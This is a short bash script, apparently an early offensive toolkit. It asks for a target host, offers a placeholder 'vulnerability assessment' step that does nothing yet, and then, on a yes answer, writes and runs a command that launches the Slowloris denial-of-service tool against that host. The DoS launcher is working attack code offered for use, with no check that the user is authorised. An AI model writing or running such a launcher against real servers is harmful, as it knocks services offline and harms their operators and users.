#!/bin/bash


# Ask the user for the target
intro()
{
echo -n "What is your target?"
read target
echo "$target" > target.txt #use  >> if you would like to append instead of overwriting
}
intro
# scripts nmap - vulnerability assessment
nmap()
{
    echo -n "Would you like to run a basic vulnerability assessment?(y/n)"
    read response
    if [[ $response == "Y" || $response == "y" ]]; then
        echo "We will do something here, but a little later, stay tuned for updates!"
    else
        echo "We will not run any of scripts as you said"
    fi
}
nmap
#dos - slowloris
slowloris()
{
    echo -n "Would you like to perform DoS?(y/n)"
    read dos
    if [[ $dos == "Y" || $dos == "y" ]]; then
        cd tools/slowloris.pl
        touch attack.txt
        echo -n "perl slowloris.pl -dns " > attack.txt
        cd ../..
        echo -n "$target" >> tools/slowloris.pl/attack.txt
        cd tools/slowloris.pl/
        bash attack.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
slowloris
